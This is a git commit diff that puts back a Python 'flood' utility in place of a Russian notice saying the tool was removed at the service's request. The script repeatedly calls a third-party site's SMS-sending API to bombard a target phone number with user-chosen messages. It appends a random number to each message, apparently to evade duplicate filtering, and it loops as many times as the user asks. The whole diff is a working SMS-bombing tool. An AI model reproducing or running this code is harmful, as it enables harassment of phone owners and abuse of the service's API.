7e4599a575658f4ddab64a427c9e0d8cbcdb7804
Security High <45529919+securityhigh@users.noreply.github.com>
2020-11-24 11:42:31 +0000

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,34 @@
 #!/usr/bin/python3
-print("Данная утилита была удалена по просьбе сервиса")
+
+import requests
+from random import random
+from sys import argv, exit
+from time import sleep
+
+
+def main():
+    print("partner overnull.ru")
+    try:
+        phone = argv[1]
+        count = int(argv[2])
+        text = input("text: ")
+
+    except:
+        print("use: ./flood.py [phone] [count] [random]")
+        exit()
+
+    for i in range(0, count):
+        flood(phone, text)
+        sleep(0.5)
+
+
+def flood(phone, text):
+    text += "\n\n" + str(random())
+    url = f"https://elis.ru/api/sms/sendSms/{text}/{phone}/"
+
+    response = requests.post(url=url, headers={"X-Requested-With": "XMLHttpRequest"})
+    print(response.content.decode())
+
+
+if __name__ == "__main__":
+    main()
